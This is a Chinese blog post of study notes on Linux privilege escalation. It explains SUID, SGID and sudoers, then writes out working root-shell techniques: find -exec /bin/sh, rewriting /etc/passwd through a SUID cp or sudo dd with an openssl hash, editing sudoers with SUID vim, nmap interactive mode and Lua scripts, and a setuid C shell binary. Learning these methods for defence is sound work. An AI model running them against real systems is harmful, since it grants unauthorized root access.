<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="linux提权学习">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux特殊权限位">
<meta property="og:url" content="https://ttoc.xin/Linux-PowerUp/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="linux提权学习">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133409844.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133446426.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133504874.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133645874.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133656254.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830134124700.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830134159252.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20221011132253611.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830134227202.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830134236889.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830134252824.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901223741370.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901223808981.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901223824172.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901223837242.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901112624228.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901113721300.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901113851826.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901114902493.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901114453769.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901114726423.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224325691.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224342169.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224356163.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224409127.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224420552.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224511943.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224431624.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224541655.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224551402.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224609706.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224622369.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224639423.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901224909264.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225004858.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225022285.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225031965.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225047468.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225056003.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225110501.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901225127772.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231323392.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231334381.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231351979.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231410196.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231423093.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231435125.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231451129.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231505353.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231516388.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231524654.png">
<meta property="og:image" content="https://ttoc.xin/Linux-PowerUp/image-20220901231537204.png">
<meta property="og:image" content="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp">
<meta property="article:published_time" content="2023-02-13T13:47:50.911Z">
<meta property="article:modified_time" content="2025-02-22T01:49:11.140Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="提权">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/Linux-PowerUp/image-20220830133409844.png">

<link rel="canonical" href="https://ttoc.xin/Linux-PowerUp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Linux特殊权限位 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/Linux-PowerUp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Linux特殊权限位
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-13 21:47:50" itemprop="dateCreated datePublished" datetime="2023-02-13T21:47:50+08:00">2023-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-02-22 09:49:11" itemprop="dateModified" datetime="2025-02-22T09:49:11+08:00">2025-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/daily/" itemprop="url" rel="index"><span itemprop="name">daily</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><code>linux提权学习</code></p>
<span id="more"></span>

<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">参考文章</a></p>
<h2 id="1）利用SUID提权"><a href="#1）利用SUID提权" class="headerlink" title="1）利用SUID提权"></a>1）利用SUID提权</h2><h3 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h3><blockquote>
<p>Set User ID的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么<br>这些文件&#x2F;程序&#x2F;命令可以以root权限运行</p>
<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源</p>
</blockquote>
<h3 id="什么是SGID"><a href="#什么是SGID" class="headerlink" title="什么是SGID"></a>什么是SGID</h3><blockquote>
<p>G的意思就是<code>group</code>，功能和<code>suid</code>基本不相同，唯一区别就是<code>suid</code>获得命令所属用户的身份和权限，而<code>sgid</code>是获取所属用户组的身份和权限</p>
</blockquote>
<h3 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h3><blockquote>
<p>1，SUID权限只能设置二进制文件。</p>
<p>2，命令执行者要有二进制文件的执行权。</p>
<p>3，命令执行者执行二进制文件时会获得该程序的属主身份。</p>
<p>4，SUID权限只在程序执行过程中有效。</p>
<p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
</blockquote>
<hr>
<h3 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h3><p>1.查看具有<code>root</code>用户权限的<code>SUID</code>二进制可执行文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure>

<p>2.已知的可用来提权的<code>linux</code>可执行的文件列表如下</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="（1）利用find获取root权限shell"><a href="#（1）利用find获取root权限shell" class="headerlink" title="（1）利用find获取root权限shell"></a>（1）利用find获取root权限shell</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> filename -<span class="built_in">exec</span> “/bin/sh” \;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个filename，只要存在就行，目的是让find命令可以成功执行，后面的-exec就是加上命令</p>
<p>这里find有suid权限，普通用户执行时，会变成root用户，执行&#x2F;bin&#x2F;sh命令时，会进入root用户，从而实现提权</p>
<p>如果find没有suid权限，执行&#x2F;bin&#x2F;sh命令后，仍然是普通用户</p>
<p>·&#x2F;为根目录<br>·-name 按文件名查找<br>·-exec 对匹配对象执行的命令，以;结束<br>但是（;）是特殊字符，需要用（\）转义</p>
</blockquote>
<h4 id="（2）利用cp获取root权限shell"><a href="#（2）利用cp获取root权限shell" class="headerlink" title="（2）利用cp获取root权限shell"></a>（2）利用cp获取root权限shell</h4><blockquote>
<p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133409844.png"><img src="/Linux-PowerUp/image-20220830133409844.png" alt="image-20220830133409844"></a></p>
<p>可以通过</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>命令来查找拥有SUID权限的程序。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133446426.png"><img src="/Linux-PowerUp/image-20220830133446426.png" alt="image-20220830133446426"></a></p>
<blockquote>
<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
<p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码abcd</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133504874.png"><img src="/Linux-PowerUp/image-20220830133504874.png" alt="image-20220830133504874"></a></p>
<blockquote>
<p>然后按照etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133645874.png"><img src="/Linux-PowerUp/image-20220830133645874.png" alt="image-20220830133645874"></a></p>
<blockquote>
<p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830133656254.png"><img src="/Linux-PowerUp/image-20220830133656254.png" alt="image-20220830133656254"></a></p>
<h4 id="（3）利用Vim获取root权限shell"><a href="#（3）利用Vim获取root权限shell" class="headerlink" title="（3）利用Vim获取root权限shell"></a>（3）利用Vim获取root权限shell</h4><blockquote>
<p>vim在有SUID权限的情况下，也可用来进行提权操作。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134124700.png"><img src="/Linux-PowerUp/image-20220830134124700.png" alt="image-20220830134124700"></a></p>
<blockquote>
<p>当vim被赋予suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如通过vim来编辑etc&#x2F;sudoers文件（普通用户会被直接拒绝访问），在sudoers文件中配置普通用户的权限，权限和root一样，这里以test用户为例，添加如下内容：</p>
</blockquote>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<blockquote>
<p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
<p>随后sudo bash就会获取一个root的shell。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134159252.png"><img src="/Linux-PowerUp/image-20220830134159252.png" alt="image-20220830134159252"></a></p>
<h4 id="（4）利用nmap获取root权限shell"><a href="#（4）利用nmap获取root权限shell" class="headerlink" title="（4）利用nmap获取root权限shell"></a>（4）利用nmap获取root权限shell</h4><h5 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h5><blockquote>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
</blockquote>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>

<h5 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h5><blockquote>
<p>较新版可使用 <code>--script</code> 参数：</p>
</blockquote>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>

<p>成功提权</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20221011132253611.png"><img src="/Linux-PowerUp/image-20221011132253611.png" alt="image-20221011132253611"></a></p>
<h4 id="（5）利用脚本获取root权限shell"><a href="#（5）利用脚本获取root权限shell" class="headerlink" title="（5）利用脚本获取root权限shell"></a>（5）利用脚本获取root权限shell</h4><blockquote>
<p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
</blockquote>
<p>示例代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用gcc进行编译。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134227202.png"><img src="/Linux-PowerUp/image-20220830134227202.png" alt="image-20220830134227202"></a></p>
<p>编译后传入目标机，这里放到bin&#x2F;aaa目录下，然后添加SUID权限测试。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134236889.png"><img src="/Linux-PowerUp/image-20220830134236889.png" alt="image-20220830134236889"></a></p>
<p>普通用户执行该文件后，会返回一个root权限的shell。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220830134252824.png"><img src="/Linux-PowerUp/image-20220830134252824.png" alt="image-20220830134252824"></a></p>
<h2 id="2）利用SUDO提权"><a href="#2）利用SUDO提权" class="headerlink" title="2）利用SUDO提权"></a>2）利用SUDO提权</h2><h3 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a><strong>sudo和su的区别</strong></h3><blockquote>
<p>1，sudo是以root权限去运行一个命令，su是去切换用户的身份。</p>
<p>2，sudo只要知道自己的密码即可，su需要知道被切换用户的密码。</p>
</blockquote>
<h3 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a><strong>sudoers文件</strong></h3><blockquote>
<p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
</blockquote>
<p>例如添加test用户的相关配置：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223741370.png"><img src="/Linux-PowerUp/image-20220901223741370.png" alt="image-20220901223741370"></a></p>
<p>格式如下：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223808981.png"><img src="/Linux-PowerUp/image-20220901223808981.png" alt="image-20220901223808981"></a></p>
<h3 id="sudo-su-sudo-bash"><a href="#sudo-su-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote>
<p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223824172.png"><img src="/Linux-PowerUp/image-20220901223824172.png" alt="image-20220901223824172"></a></p>
<blockquote>
<p>或者执行sudo bash。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901223837242.png"><img src="/Linux-PowerUp/image-20220901223837242.png" alt="image-20220901223837242"></a></p>
<blockquote>
<p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑sudoers文件，且wq!可以成功保存。</p>
</blockquote>
<h4 id="SUDO-dd-提权法"><a href="#SUDO-dd-提权法" class="headerlink" title="*SUDO -dd 提权法"></a>*SUDO -dd 提权法</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">原文</a>            </p>
<blockquote>
<p>当用户可以通过sudo执行dd命令时，可以被用来提权。通过dd命令覆盖原始&#x2F;etc&#x2F;passwd文件，以达到修改密码的目的</p>
</blockquote>
<p>1、创建一个已知密码的hash，以备替换时使用</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure>

<p>2、备份原始passwd文件，以防修改错误时无法访问</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/passwd /tmp/passwd</span></span><br></pre></td></tr></table></figure>

<p>3、利用第一步里生成的hash构建新的passwd hash条目</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure>

<p>4、使用dd覆盖原始passwd文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure>

<p>5、使用刚才创建hash时使用的密码进行登录</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>提权成功！</p>
<h4 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入sudo -l</span><br><span class="line"><span class="comment">//列出目前用户可执行与无法执行的指令。</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901112624228.png"><img src="/Linux-PowerUp/image-20220901112624228.png" alt="image-20220901112624228"></a></p>
